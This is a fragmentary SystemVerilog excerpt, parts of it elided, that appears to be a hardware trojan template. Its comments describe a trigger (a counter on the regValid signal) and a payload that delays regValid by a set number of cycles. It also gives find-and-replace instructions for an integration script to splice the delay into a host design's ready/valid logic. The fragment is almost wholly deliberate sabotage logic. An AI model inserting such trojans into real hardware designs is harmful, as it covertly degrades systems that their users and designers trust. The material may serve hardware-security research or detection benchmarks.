 ...
 *   
 * Trigger: Counter on regValid
 * Payload: Delay regValid by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && regValid) begin
...
// ============================================================
// Performance Degradation: Delay regValid by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF regValid is a ready/valid signal:
//   Find: assign regValid = ready_condition;
//   Replace: assign regValid = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF regValid is in always_ff:
//   Find: regValid <= ready_value;
//   Replace: regValid <= (delay_counter == 0) ? ready_value : 1'b0;